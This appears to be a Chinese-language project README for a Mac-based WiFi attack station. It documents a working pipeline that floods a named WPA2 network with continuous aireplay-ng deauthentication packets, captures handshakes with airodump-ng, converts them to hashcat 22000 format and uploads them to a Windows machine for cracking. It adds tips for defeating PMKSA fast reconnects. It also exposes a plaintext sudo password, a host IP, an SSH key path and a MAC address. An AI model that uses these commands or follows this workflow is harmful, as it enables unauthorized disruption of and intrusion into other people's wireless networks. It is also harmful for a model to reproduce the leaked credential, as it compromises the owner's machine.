# Mac Capture Station → Hashcat 22000

> **權威說明看 repo root 的 [`KNOWN_GOOD.md`](../KNOWN_GOOD.md)。** 本檔只補 Mac 端細節。
> 已知能抓包+能破解的乾淨版本 = base commit `628830b`。

## 機器

Apple Silicon **M2 Air**, macOS 26.6.2。Remote: `tongbao@192.168.1.123`（IP 會隨 DHCP 變，以 ping/sweep 為準），SSH key `~/.ssh/opremote_ed25519`，**sudo 密碼 `240628`**。

目標 `32H10F`（2.4G WPA2）。

## 分工（別搞反）

- **內建 en0（Apple AirPort）** = **網路 / SSH**（待在家，供 SSH 與網路；**不禁、不動**）。MAC `74:a6-cd:bd:43:f2`。
- **USB 網卡 DWA-160** = **抓包卡**（純 capture，不負責網路）。
  - Ralink **RT5592**，USB id **`148f:5572`**（`ioreg -r -c IOUSBHostDevice` 看得見，"802.11 n WLAN"）。
  - macOS 有 `RtWlanU*.kext`；**抓包不走 macOS 驅動**——USB passthrough 進 QEMU VM，由 VM 內 **`rt2800usb`** + **`rt2870.bin`** 驅動。
  - `system_profiler` 常抓不到它（回 0），**用 `ioreg` 判存在**，別誤以為沒插。

> 之前 `disable_builtin_wifi.sh` 是「禁內建→改走 USB」的**舊假設**（讓 Mac 只跑 USB 卡）。
> **本版本（known-good）不用它**：內建留著跑網路，DWA-160 只負責抓包，兩者並存、互不影響。

## 檔案

| 檔 | 說明 |
|---|---|
| `disable_builtin_wifi.sh` | （備用/舊路線）禁內建 en0 讓 Mac 改走 USB 卡。`off`/`on`。本版本 default **不用**。 |
| `wake_mac.py` | WoL magic packet（預設 en0 MAC）。WoL 時好時壞（randomized MAC/深睡），**實體喚醒最可靠**。 |
| `../mac_capture_app.py` | **主程式**：QEMU VM（Alpine + DWA-160 USB）→ airodump monitor + deauth 風暴 → hcxpcapngtool → POST `.22000` 到 Windows:8766。 |

## 抓包流程（known-good）

```sh
# Mac 上（mac_capture_app.py 自動做這些）：
# 1) 確認 DWA-160 在 USB（ioreg）、VM qcow2/initramfs/rt2870.bin 在 /tmp
# 2) 起 QEMU（-device usb-host,bus=xhci.0,vendorid=0x148f,productid=0x5572）
# 3) SSH 進 VM：iw dev wlan0 set type monitor; ifconfig wlan0 up
# 4) nohup aireplay-ng --deauth 9999 --ignore-negative-one -a <BSSID> -c <CLIENT> wlan0 &
# 5) 多次 timeout 10 airodump-ng -w /tmp/capapp -c <CH> wlan0（累積）
# 6) ls /tmp/capapp-*.cap | xargs hcxpcapngtool -o /tmp/capapp.22000
# 7) POST .22000 → Windows http://<win>:8766/api/receive-hash
```

## 注意 / 坑

- **WoL**：內建 MAC randomized + 深睡 → magic packet 不穩；**實體喚醒最可靠**。
- **RT5592 韌體**：VM 內缺 `rt2870.bin` → wlan0 半初始化、進不了 monitor（`SIOCSIWMODE failed`）。qcow2 的 `/lib/firmware/` 要有 `rt2870.bin`（`/init` 會 delay-load）。
- **PMKSA**：真實 client 被 deauth 後多走 PMKSA 快重連（跳完整 4-way）→ 短窗常 0 EAPOL；靠「更長 capture + 持續 deauth」累積，或抓 PMKID 亦可 crack（同 keyspace）。
- **monitor 全幀**：EAPOL 4-way（M1–M4）是 **DATA 幀**（EtherType 0x888E），**別加 `wlan type mgt` 過濾**，否則 handshake 被濾掉。